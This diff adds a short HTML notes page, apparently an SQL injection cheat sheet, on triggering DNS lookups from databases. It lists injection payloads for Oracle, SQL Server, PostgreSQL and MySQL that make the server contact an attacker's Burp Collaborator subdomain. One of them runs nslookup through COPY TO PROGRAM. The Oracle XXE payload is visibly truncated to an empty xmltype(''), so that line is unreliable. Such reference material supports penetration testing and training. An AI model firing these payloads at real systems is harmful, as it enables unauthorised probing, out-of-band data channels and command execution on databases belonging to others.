@@ -1,0 +1,14 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>DNS lookup</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles2.css" type="text/css" />
+</head>
+<body><h1><b><u>DNS lookup</u></b></h1>You can cause the database to perform a DNS lookup to an external domain. <br />To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.<br /><table class="table"><col/><col/><tr><th>Database</th><th>Syntax</th></tr><tr><td>Oracle</td><td>The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+SELECT extractvalue(xmltype(''),'/l') FROM dual
+
+The following technique works on fully patched Oracle installations, but requires elevated privileges:
+SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')</td></tr><tr><td>Microsoft</td><td>exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'</td></tr><tr><td>PostgreSQL</td><td>copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'</td></tr><tr><td>MySQL</td><td>The following techniques work on Windows only:
+LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
+SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'</td></tr></table><br /></body></html>
